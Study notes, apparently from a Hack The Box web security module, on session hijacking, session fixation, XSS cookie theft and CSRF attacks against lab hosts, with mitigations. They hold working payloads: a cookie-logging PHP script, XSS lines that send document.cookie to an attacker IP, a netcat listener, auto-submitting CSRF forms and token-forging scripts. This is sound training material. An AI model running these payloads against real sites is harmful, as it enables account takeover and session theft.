# Session Security

# User Sessions

- **Definition**: A session is a series of requests and responses between a client and server during a specific time.
- **Purpose**:
    - Tracks user data across multiple requests.
    - Manages access rights, localization, and authentication.
- **Challenge**:
    - HTTP is **stateless**, meaning each request is independent.
    - Sessions track state by using **cookies, URL parameters, or proprietary methods**.

---

### **Session Identifier Security**

A secure session identifier prevents session hijacking by ensuring:

1. **Scope** – Each session has a unique, non-reusable identifier.
2. **Randomness** – Session IDs are unpredictable, generated through strong algorithms.
3. **Expiry** – Session IDs have time-based expiration.

**Session ID Vulnerabilities**:

- **Passive Capture** – Packet sniffing or network monitoring.
- **Logs** – Session IDs accidentally logged in plaintext.
- **Prediction** – Weak or incremental session ID generation.
- **Brute Force** – Guessing session IDs through enumeration.

---

### **Session ID Storage Methods**

- **URL**: Leaks through browser history and referrer headers.
- **HTML**: Stored in the DOM or cache, exposing the session to theft.
- **sessionStorage**:
    - Cleared when the tab/browser is closed.
    - Safer for temporary session data.
- **localStorage**:
    - Persistent storage across browser restarts (except incognito/private mode).
    - Not automatically cleared, vulnerable if the user does not manually delete it.

---

### **Session Attack Types**

1. **Session Hijacking**:
    - Attacker gains access to a session ID and impersonates the victim.
2. **Session Fixation**:
    - Attacker fixes a known session ID and forces the victim to log in using it.
3. **Cross-Site Scripting (XSS)**:
    - Steals session IDs through malicious scripts executed in the victim’s browser.
4. **Cross-Site Request Forgery (CSRF)**:
    - Forces a user to unknowingly send authenticated requests to the server.
5. **Open Redirects**:
    - Redirects victims to attacker-controlled sites, potentially capturing sensitive session data.

---

### **Security Considerations**

- **Check Hosts File**: Ensure the hosts file is updated when spawning new targets.
- **Automate**: Write scripts to append virtual host entries to `/etc/hosts` dynamically.

---

# Session Hijacking

**Goal**:

- Exploit insecure session management by stealing or guessing session identifiers to impersonate users.

**Methods to Obtain Session Identifiers**:

1. **Passive Traffic Sniffing** – Capturing unencrypted network traffic.
2. **Cross-Site Scripting (XSS)** – Injecting scripts to exfiltrate cookies.
3. **Browser History/Logs** – Extracting session IDs from logs or cached data.
4. **Database Access** – Direct access to session storage in databases.
5. **Brute Force/Prediction** – Exploiting weak session generation algorithms.

---

### **Key Takeaways**

- **Session Hijacking is Dangerous** – Allows unauthorized access without knowing the user’s password.
- **Multiple Cookies** – Some applications use **more than one cookie** for session management. Always check for multiple session-related cookies.
- **Private Windows** – Simulating attacks in **incognito/private mode** ensures that session data doesn’t persist across tests.

---

# Session Fixation

**Goal**:

- Force a victim to authenticate with a session identifier pre-determined by the attacker, allowing for **session hijacking** once the victim logs in.

---

### **Attack Stages**

1. **Stage 1: Obtain a Valid Session ID**
- Attacker accesses the application, and a valid session identifier is generated (no authentication required).
- Alternatively, the attacker registers a new account and receives a valid session.
1. **Stage 2: Fixate the Session ID**
- If the **session ID remains the same post-login**, this is a vulnerability.
- Session IDs are often accepted via:
    - **URL Query Strings** (e.g., `?session=12345`)
    - **POST Data**
- This lets the attacker control the session ID directly by modifying these parameters.
1. **Stage 3: Trick Victim into Using Session ID**
- Attacker crafts a URL with a malicious session ID and convinces the victim to log in via phishing, malicious links, etc.

---

## **Session Fixation Example**

### **Part 1: Identify the Vulnerability**

1. **URL Format**:
    
    ```
    http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM_TOKEN>
    ```
    
2. **Inspect Session**:
    - Open **Developer Tools** (`Shift + Ctrl + I` in Firefox).
    - Observe the **PHPSESSID** cookie value.
    - It matches the **token** value in the URL.

---

### **Part 2: Exploit the Vulnerability**

1. **Open Private Window** (to simulate a new user).
2. **Craft a URL** with a session ID you control:
    
    ```
    http://oredirect.htb.net/?redirect_uri=/complete.html&token=IControlThisCookie
    ```
    
3. **Inspect Cookies Again**:
    - The PHPSESSID is now set to `IControlThisCookie`.
4. **Trick the Victim**:
    - Send the malicious URL to the victim.
    - If they log in, the attacker can reuse the **fixated session ID** to impersonate them.

---

### **Key Takeaways**

- **Fixation = Control of Session** before victim logs in.
- **Propagation via URL or POST data** indicates weak session management.
- **Mitigation**:
    - Regenerate session ID **post-login** (`session_regenerate_id()` in PHP).
    - Restrict session IDs to **cookies only** (avoid URL propagation).
    - Implement secure session handling practices (e.g., invalidate old sessions).

---

### **Code Breakdown (Vulnerable Example)**

```php
<?php
    if (!isset($_GET["token"])) {
        session_start();
        header("Location: /?redirect_uri=/complete.html&token=" . session_id());
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
```

- **If token is absent** → Create new session (`session_start()`).
- **Else (token exists)** → Use `setcookie()` to overwrite PHPSESSID with the URL token.

---

### **Exploitation Flow**

1. **Visit with No Token** → New session created, user redirected with `token=session_id()`.
2. **Visit with Token** → PHPSESSID overwritten by the attacker-supplied value.
3. **Impact**:
    - Attacker can pre-set a session ID and hijack the victim’s session post-login.

# **Obtaining Session Identifiers without User Interaction**

There are multiple ways an attacker can obtain session identifiers without user interaction. This can happen through traffic sniffing, post-exploitation (via web server access), or direct access to databases. Below is a breakdown of techniques and methodologies used to extract session IDs.

---

## **1. Traffic Sniffing**

**Goal**: Capture session identifiers by intercepting unencrypted HTTP traffic.

### **Requirements**:

- **Same Local Network**: The attacker must be on the same network segment as the victim.
- **Unencrypted HTTP**: Traffic must not be protected by SSL/TLS (HTTPS) or IPsec.

### **Tools**:

- **Wireshark** (primary tool for packet sniffing).

### **Process**:

1. **Start Wireshark**:
    
    ```bash
    sudo wireshark
    ```
    
2. **Select Interface**: Choose the network interface to monitor (e.g., eth0 or wlan0).
3. **Filter Traffic**: Apply the following filter to capture HTTP traffic:
    
    ```
    http.cookie
    ```
    
4. **Capture Session IDs**: Identify and extract `PHPSESSID`, `JSESSIONID`, or similar cookies from captured HTTP requests.

### **Example**:

- Sniffed HTTP GET request with `PHPSESSID=abc123` reveals the session ID.
- An attacker can replay this session ID by adding it to their own cookies, impersonating the victim.

---

## **2. Post-Exploitation (Web Server Access)**

If the attacker compromises the web server (through RCE, weak credentials, etc.), session identifiers can be extracted from disk or memory.

---

### **PHP**

- **Location of PHP Sessions**:
    
    ```bash
    locate php.ini
    cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
    cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
    ```
    
    - **Default Path**: `/var/lib/php/sessions`
- **Find Session Files**:

![image.png](image%20139.png)

In our default configuration case it's `/var/lib/php/sessions`. Now, please note a victim has to be authenticated for us to view their session identifier. The files an attacker will search for use the name convention `sess_<sessionID>`.

- **Extract Session Data**:
    
    ```bash
    cat /var/lib/php/sessions/sess_<sessionID>
    ```
    

```bash
DarkSideDani@htb[/htb]$ ls /var/lib/php/sessions
DarkSideDani@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

![image.png](image%20140.png)

As already mentioned, for a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:

- cookie name: PHPSESSID
- cookie value: s6kitq8d3071rmlvbfitpim9mm

---

### **Java (Tomcat Servers)**

- **Session Storage Location**:
    
    ```bash
    /opt/tomcat/work/Catalina/localhost/SESSIONS.ser
    ```
    
- Tomcat serializes active sessions into `SESSIONS.ser` files.
- **Extract and Replay**: Deserialize the session file and reuse `JSESSIONID`.

---

### **.NET (ASP.NET Applications)**

- **Session Storage Options**:
    - **InProc**: Session stored in worker process (`aspnet_wp.exe`).
    - **OutProc**: Stored in a Windows service (`StateServer`).
    - **SQL Server**: Sessions can be stored in a dedicated database table.
- **Locate Session in SQL**:
    
    ```sql
    SELECT * FROM ASPStateTempSessions;
    ```
    

---

## **3. Post-Exploitation (Database Access)**

If the attacker gains access to the application database (via SQL Injection or credential compromise), session data can often be extracted directly from tables.

### **Example**:

```sql
show databases;
use project;
show tables;
select * from users;
```

![image.png](image%20141.png)

- **Identify Sessions**:
    
    ```sql
    select * from all_sessions;
    select * from all_sessions where id=3;
    ```
    

![image.png](image%20142.png)

Here we have successfully extracted the sessions! You could now authenticate as the user "Developer."

---

## **Mitigation Techniques**

- **Use HTTPS**: Encrypt traffic to prevent session sniffing.
- **Regenerate Session IDs**: Use `session_regenerate_id()` in PHP after login.
- **Limit Session Lifetime**: Reduce the time session IDs remain valid.
- **Secure Session Storage**: Limit session access to the root user (`chmod 700`).
- **HttpOnly & Secure Flags**:
    
    ```php
    setcookie('PHPSESSID', session_id(), [
        'httponly' => true,
        'secure' => true,
        'samesite' => 'Strict'
    ]);
    
    ```
    

---

# XSS - for session hijacking

<aside>
💡

**Note**: If you're doing testing in the real world, try using something like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

</aside>

### **Pre-requisites for Successful Session Stealing:**

- **Session Cookies Accessible via JavaScript:**
    - The `HTTPOnly` attribute must be absent for cookies to be read by JavaScript.
- **Session Cookies Present in HTTP Requests:**
    - Cookies must be included in client requests to interact with the web application.

---

### **Stage 1: Discovering XSS Vulnerability:**

1. **Log In to Application:**
    - **URL:** `http://xss.htb.net`
    - **Email:** `crazygorilla983`
    - **Password:** `pisces`
    - After logging in, navigate to the profile section where fields like "Email," "Phone," and "Country" are editable.
    
    ![image.png](image%20143.png)
    
2. **Inject XSS Payloads:**
    
    ```jsx
    "><img src=x onerror=prompt(document.domain)>
    ```
    
    - Insert the payload in the "Country" field and save the profile.
    
    We are using `document.domain` to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks. It should be noted that sandbox escapes exist but are outside the scope of this module.
    
    In the remaining two fields, let us specify the following two payloads.
    
    - `"><img src=x onerror=confirm(1)>`
    - `"><img src=x onerror=alert(1)>`
    
    ![image.png](image%20144.png)
    

---

### **Stage 2: Triggering the XSS Payload:**

1. **Navigate to the 'Share' Section:**
    - Look for shared/public-facing pages that reflect profile data.
    - When the payload is reflected, it confirms stored XSS vulnerability.

![image.png](image%20145.png)

1. Let us now check if *HTTPOnly* is "off" using Web Developer Tools.
    
    ![image.png](image%20146.png)
    

---

### **Stage 3: Extracting Session Cookies via XSS:**

1. **Check HTTPOnly Status:**
    - Open **Web Developer Tools** (Ctrl+Shift+I) and inspect cookies.
    - Ensure the `HTTPOnly` flag is **not set**.
2. **Prepare Cookie Stealer Script (log.php):**
    
    ```php
    <?php
    $logFile = "cookieLog.txt";
    $cookie = $_REQUEST["c"];
    
    $handle = fopen($logFile, "a");
    fwrite($handle, $cookie . "\n\n");
    fclose($handle);
    
    header("Location: http://www.google.com/");
    exit;
    ?>
    ```
    
    - This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.
    - Host this script on your attacking machine or VPS.
3. **Run PHP Server:**
    
    ```bash
    php -S <VPN/TUN IP>:8000
    ```
    

**Note**: If you're doing testing in the real world, try using something like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

---

### **Stage 4: Launching the Attack:**

- Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the *Country* field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.
1. **Modify the Payload to Steal Cookies:**
    
    ```jsx
    <style>@keyframes x{}</style>
    <video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN IP>:8000/log.php?c=' + document.cookie;"></video>
    ```
    
2. **Simulate Victim:**
    - **Victim Credentials:**
        - **Email:** `smallfrog576`
        - **Password:** `guitars`
    - Victim visits the attacker's profile (`ela.stienen@example.com`) via: **`http://xss.htb.net/profile?email=ela.stienen@example.com`**
    - The payload triggers, sending the session cookie to the attacker's PHP server.
3. **Confirm the Cookie Capture:**

```bash
└─$ php -S 10.10.15.197:8000   
[Wed Jan  8 21:41:05 2025] PHP 8.2.18 Development Server (http://10.10.15.197:8000) started
[Wed Jan  8 21:50:12 2025] 10.10.15.197:56184 Accepted
[Wed Jan  8 21:50:12 2025] 10.10.15.197:56184 [302]: GET /log.php?c=auth-session=s%3AcaPN6dfTLFiUpMUI1LDUggXwcpXkZZvB.KgxyOeLLNcxJ8TfBKcp%2FIYYmkk0GNYoMIXaqs6tYtc8
[Wed Jan  8 21:50:12 2025] 10.10.15.197:56184 Closing
```

```bash
cat cookieLog.txt                                                                         
auth-session=s:caPN6dfTLFiUpMUI1LDUggXwcpXkZZvB.KgxyOeLLNcxJ8TfBKcp/IYYmkk0GNYoMIXaqs6tYtc8
```

- The victim's cookie is stored, allowing the attacker to hijack the session.

---

### **Alternative: Use Netcat to Capture Cookies:**

1. **Prepare XSS Payload:**
    
    ```jsx
    <h1 onmouseover='document.write(`<img src="http://<VPN/TUN IP>:8000?cookie=${btoa(document.cookie)}">`)'>Hover Over Me Bitch!</h1>
    ```
    
    ![image.png](image%20147.png)
    
2. **Start Netcat Listener:**
    
    ```bash
    nc -nlvp 8000
    ```
    
3. **Trigger the Attack:**
    - Victim visits the malicious profile and hovers over "our text".
    - The cookie is captured and encoded in Base64.
    
    ```bash
    nc -nlvp 8000
    listening on [any] 8000 ...
    connect to [10.10.15.197] from (UNKNOWN) [10.10.15.197] 39574
    GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0FjYVBONmRmVExGaVVwTVVJMUxEVWdnWHdjcFhrWlp2Qi5LZ3h5T2VMTE5jeEo4VGZCS2NwJTJGSVlZbWtrMEdOWW9NSVhhcXM2dFl0Yzg= HTTP/1.1
    Host: 10.10.15.197:8000
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: image/avif,image/webp,*/*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: keep-alive
    Referer: http://xss.htb.net/
    ```
    
4. **Decode Cookie (Optional):**
    
    ```jsx
    echo "YXV0aC1zZXNzaW9uPXMlM0FjYVBONmRmVExGaVVwTVVJMUxEVWdnWHdjcFhrWlp2Qi5LZ3h5T2VMTE5jeEo4VGZCS2NwJTJGSVlZbWtrMEdOWW9NSVhhcXM2dFl0Yzg=" | base64 -d
    #
    auth-session=s%3AcaPN6dfTLFiUpMUI1LDUggXwcpXkZZvB.KgxyOeLLNcxJ8TfBKcp%2FIYYmkk0GNYoMIXaqs6tYtc8
    ```
    

---

### **Stealthier Payloads (No Redirects):**

Instead of redirecting the victim, use `fetch()` for silent cookie extraction:

```jsx
<script>fetch(`http://<VPN/TUN IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

---

### **Best Practices for Payloads:**

- **HTTPS -> HTTPS:** Use platforms like **XSSHunter** or **Burp Collaborator**.
- **Stealth Attacks:** Use `fetch()` or `XMLHttpRequest` instead of redirecting users.

By chaining XSS with session hijacking, attackers can gain persistent access to victim accounts, highlighting the importance of securing web applications by setting the `HTTPOnly` flag on session cookies and validating input fields.

# **Cross-Site Request Forgery (CSRF or XSRF)**

### **Understanding CSRF:**

- **CSRF** forces users to perform unintended actions in web applications where they are authenticated.
- Attackers leverage **malicious web pages** to execute these unauthorized actions by exploiting the victim's active session.

---

### **Key Conditions for CSRF Attacks:**

1. **Parameters are Predictable:**
The attacker can guess or determine the necessary parameters.
2. **Session Management via Cookies:**
Browsers automatically send session cookies with requests.

---

### **Requirements for CSRF Exploitation:**

- **Craft a malicious page** that submits unauthorized requests to the target application.
- **Victim must be authenticated** to the target app when the malicious request is made.

---

### **Stage 1: Identifying CSRF Vulnerability**

1. **Log In to Application:**
    - **URL:** `http://xss.htb.net`
    - **Email:** `crazygorilla983`
    - **Password:** `pisces`
2. **Intercept Requests with Burp Suite:**
    - Set up Burp Suite's **Proxy (Intercept On)** and route your browser traffic through Burp.
    - Click **"Save"** to update the profile.
3. **Review the Request (Burp Suite):**
    - **Observe:** No `CSRF token` is present in the POST request.
    - This indicates that the app lacks CSRF protection, making it vulnerable.
    
    ![image.png](image%20148.png)
    

---

### **Stage 2: Crafting the CSRF Exploit**

1. **Create a Malicious HTML Page:**
    
    Save the following as `notmalicious.html`:
    
    ```html
    <html>
      <body>
        <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
          <input type="hidden" name="email" value="attacker@htb.net" />
          <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
          <input type="hidden" name="country" value="CSRF_POC" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.getElementById("submitMe").submit();
        </script>
      </body>
    </html>
    ```
    
    **Explanation:**
    
    - **Form Auto-Submission:** The JavaScript automatically submits the form without user interaction.
    - **Hidden Parameters:** Update the profile without requiring manual input.

![image.png](image%20149.png)

---

### **Stage 3: Serving the CSRF Page**

1. **Host the HTML File on Python HTTP Server:**
    
    ```bash
    python -m http.server 1337
    ```
    
    - This serves the file at: **`http://<VPN/TUN Adapter IP>:1337/notmalicious.html`**
    - Ensure no proxy is required for this phase.

---

### **Stage 4: Executing the Attack**

1. **Simulate Victim Interaction:**
    - Open a **new tab** and visit:
        
        ```
        http://<VPN/TUN Adapter IP>:1337/notmalicious.html
        ```
        
    - The profile for **Ela Stienen** will update with the attacker's data (`attacker@htb.net`).
2. **Confirmation:**
    - Check if the profile now reflects the data from the malicious request.
    
    ![image.png](image%20150.png)
    

---

Our assumption that there is no CSRF protection in the application was correct. We were able to change Ela Stienen's profile details via a cross-site request.

We can now use the malicious web page we crafted to execute CSRF attacks against other users.

### **Key Observations:**

- **Lack of CSRF Tokens:**
No protection mechanism exists to validate the authenticity of the cross-site request.
- **Silent Exploitation:**
The victim unknowingly triggers the CSRF payload while authenticated.

---

### **Preventing CSRF Vulnerabilities (Best Practices):**

1. **Use CSRF Tokens:**
    - **Anti-CSRF tokens** must be included in **every state-changing request**.
    - Validate the token server-side before processing the request.
2. **SameSite Cookies:**
    - Set the `SameSite` attribute on cookies to `Strict` or `Lax`:
        
        ```bash
        Set-Cookie: sessionid=abc123; SameSite=Strict
        ```
        
3. **User Interaction Requirements:**
    - Prompt users for re-authentication or CAPTCHA for sensitive actions.
4. **Custom Headers Validation:**
    - Require **custom headers** that browsers don't set by default (e.g., `X-CSRF-TOKEN`).
5. **Referer and Origin Checking:**
    - Verify `Referer` or `Origin` headers to confirm requests originate from legitimate domains.

---

### **Final Notes:**

- **Chaining CSRF with XSS** or **Open Redirects** can escalate attacks to full account takeovers.
- Always assume CSRF vulnerabilities can affect **critical endpoints** (e.g., password changes, admin panel modifications).

# Cross-Site Request Forgery (GET-based)

![image.png](image%20151.png)

![image.png](image%20152.png)

The CSRF token is included in the GET request.

Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack. Of course, they could have just performed a session hijacking attack using the sniffed session cookie.

First, create and serve the below HTML page. Save it as `notmalicious_get.html`

```bash
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

```bash
python -m http.server 1337
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.

![image.png](image%20153.png)

- Cookie Grabber :

```bash
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

- Cookie Splitter:

```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

# Cross-Site Request Forgery (POST-based)

The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

---

After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>` 

![image.png](image%20154.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into the *email* value, such as:

```bash
<h1>h1<u>underline<%2fu><%2fh1>
```

![image.png](image%20155.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

![image.png](image%20156.png)

```bash
nc -nlvp 8000
```

Now we can get the CSRF token via sending the below payload to our victim.

```bash
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

![image.png](image%20157.png)

- Since the attack was successful against our test account, we can do the same against any account of our choosing.
- This attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

# XSS & CSRF Chaining

### **Scenario Overview:**

- **Objective:** Chain a stored **XSS** vulnerability with **CSRF** to bypass same-origin/same-site restrictions.
- **Target Application:**
    - Uses **same-origin/same-site protections** as an anti-CSRF measure.
    - The **Country** field is vulnerable to **stored XSS**.
    - The **Change Visibility** request allows toggling profiles between "private" and "public."

By leveraging the **stored XSS vulnerability**, we can execute a CSRF attack that bypasses same-origin/same-site protections, allowing us to change a victim's profile visibility.

---

### **Step-by-Step Exploitation:**

### **1. Setup Target System**

1. **Access the Target Application:**
    - URL: `http://minilab.htb.net`
    - **Login Credentials:**
        - Email: `crazygorilla983`
        - Password: `pisces`
2. **Inspect Functionality:**
    - Notice that "Ela Stienen's" profile is private and lacks a "Share" option.
3. **Launch Burp Suite to Intercept Requests:**
    - Enable **Proxy (Intercept On)** and configure your browser to route traffic through Burp.
    
    ![image.png](image%20158.png)
    

---

### **2. Identify the CSRF-Protected Request**

1. **Toggle Visibility:**
    - Click **"Change Visibility"** > **"Make Public!"** in Ela's profile.
    - Observe the intercepted POST request in Burp:
        - Path: `/app/change-visibility`
        - Parameters: `csrf` and `action=change`
2. **Analyze the Anti-CSRF Mechanism:**
    - CSRF tokens are present in the request.
    - However, we can bypass this protection using XSS to extract the victim's CSRF token and use it to perform the request.

---

### **3. Develop XSS Payload**

**Payload for Country Field:**

```jsx
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

**Payload Breakdown:**

The script snippet above creates an ObjectVariable called **`req`**, which we will be using to generate a request. **`var req = new XMLHttpRequest();`** is allowing us to get ready to send HTTP requests.

- **`req.onload = handleResponse;`** this will perform an action once the page has been loaded.
- **`req.open('get','/app/change-visibility',true);` -** ‘get’ is the request method, targeted path is ‘/app/change-visibility/, ‘true’ will continue the exec
- **`req.send();` -** this will send everything we constructed in the HTTP request.
- **`var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];` -** this looks for a hidden input field called **`csrf`**and **`\w+`** matches one or more alphanumeric chars

```jsx
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
```

- The script snippet above constructs the HTTP request that we will send through a [XMLHttpRequest](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/) object.
- **`changeReq.open('post', '/app/change-visibility', true);` -** this changes the method from **`GET`**to **`POST`** — The first request was to move us to the targeted page and the second request was to perform the wanted action
- `changeReq.send('csrf='+token+'&action=change');` - sends the request with one param **`csrf`** having the value of the token variable, which essentially is the victim’s CSRF token and param **`action`** with the value **`change`** (the 2 parameters we observed)
    
    ![image.png](image%20159.png)
    

**— SUMMARY:**

1. **Extract CSRF Token:**
    - Sends a `GET` request to `/app/change-visibility` to fetch the page.
    - Parses the response for the CSRF token (`<input name="csrf" type="hidden">`).
2. **Submit a POST Request:**
    - Constructs a `POST` request using the extracted CSRF token.
    - Sends the `csrf` token along with `action=change` to toggle the profile visibility.

We can use the *search* functionality to look for a specific string. In our case, we look for *csrf*, and we get a result.

![image.png](image%20160.png)

<aside>
💡

**Note**: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for. If you still get no results, this doesn't mean that the application employs no anti-CSRF protections. There could be another form that is protected by an anti-CSRF protection.

</aside>

---

### **4. Deploy the Payload**

**Inject the Payload:**

- Submit the full JavaScript payload to the **Country** field of Ela Stienen's profile.
- Click **"Save"** to update the profile.

![image.png](image%20161.png)

---

### **5. Simulate Victim Interaction**

1. **Victim Profile Setup:**
    - Login as the victim:
        - Email: `goldenpeacock467`
        - Password: `topcat`
    - Observe that the victim's profile is private (no "Share" button visible).
2. **Victim Visits Attacker-Crafted Profile:**
    - Victim opens:
        
        ```
        http://minilab.htb.net/profile?email=ela.stienen@example.com
        ```
        
    - The XSS payload executes in the victim's browser, sending the CSRF-protected request to make the victim's profile public.

---

### **6. Verify Exploitation**

1. **Refresh Victim's Profile Page:**
    - Notice the **"Share" button** now appears on the victim's profile page, confirming the profile visibility has been toggled to "public."
    
    ![image.png](image%20162.png)
    

---

### **Key Observations:**

- **Bypassing Same-Origin/Same-Site Restrictions:**
The **XSS payload executes on the same domain** as the target application, bypassing these protections.
- **Leveraging CSRF Tokens:**
XSS is used to extract the victim's CSRF token, enabling a state-changing request.

---

### **Mitigation Techniques**

1. **Sanitize User Inputs:**
    - Use a robust library to sanitize inputs and prevent injection attacks.
2. **HTTPOnly Cookies:**
    - Mark session cookies as `HttpOnly` to prevent JavaScript access.
        
        ```bash
        Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
        ```
        
3. **Strong CSRF Protections:**
    - Use anti-CSRF tokens that are:
        - **Randomly generated.**
        - Validated server-side for every state-changing request.
4. **Content Security Policy (CSP):**
    - Define a CSP header to restrict sources of executable scripts:
        
        ```bash
        Content-Security-Policy: script-src 'self';
        ```
        
5. **Same-Site Cookies:**
    - Set cookies to `SameSite=Strict` to limit cross-origin requests.

---

# **Exploiting Weak CSRF Tokens**

---

### **Overview**

This walkthrough demonstrates how to exploit a weak CSRF token generation mechanism where the token is generated using a predictable method, such as `md5(username)`. Once identified, this predictable pattern allows attackers to forge valid CSRF tokens and perform unauthorized actions.

---

### **Step-by-Step Exploitation**

### **1. Analyze the Target Application**

1. **Access the Target Application**
2. **Trigger the CSRF Token:**
    - Navigate to the user profile page.
    - Click **"Change Visibility"** > **"Make Public"** to generate a CSRF token.
    - Intercept the request using browser DevTools or Burp Suite.
3. **Extract the CSRF Token:**
    - Note the value of the CSRF token from the intercepted request.
    - Example CSRF token: `0bef12f8998057a7656043b6d30c90a2`.
    
    ![image.png](image%20163.png)
    

---

### **2. Reverse Engineer the CSRF Token**

1. **Identify the Pattern:**
    - Based on the predictable pattern hypothesis (`md5(username)`), compute the MD5 hash of the username `goldenpeacock467`:
        
        ```bash
        echo -n goldenpeacock467 | md5sum
        0bef12f8998057a7656043b6d30c90a2  -
        ```
        
    - The computed hash matches the CSRF token, confirming the weak generation mechanism.
    
    <aside>
    💡
    
    When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as `md5(username)`, `sha1(username)`, `md5(current date + username)` etc. 
    
    </aside>
    

---

### **3. Craft the Exploit**

1. **Prepare the Malicious HTML File:**
    - Save the following HTML as `press_start_2_win.html`:
        
        ```html
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Proof-of-Concept</title>
            <script src="./md5.min.js"></script>
        </head>
        <body>
            <h1>Click Start to Win!</h1>
            <button onclick="trigger()">Start!</button>
        
            <script>
                let host = 'http://csrf.htb.net';
        
                function trigger() {
                    window.open(`${host}/app/change-visibility`);
                    window.setTimeout(startPoc, 2000);
                }
        
                function startPoc() {
                    let hash = md5("crazygorilla983");
                    window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`;
                }
            </script>
        </body>
        </html>
        ```
        
    - Replace `"crazygorilla983"` with the victim's username whose token is being forged.
2. **Add the MD5 Script:**
    
    ```jsx
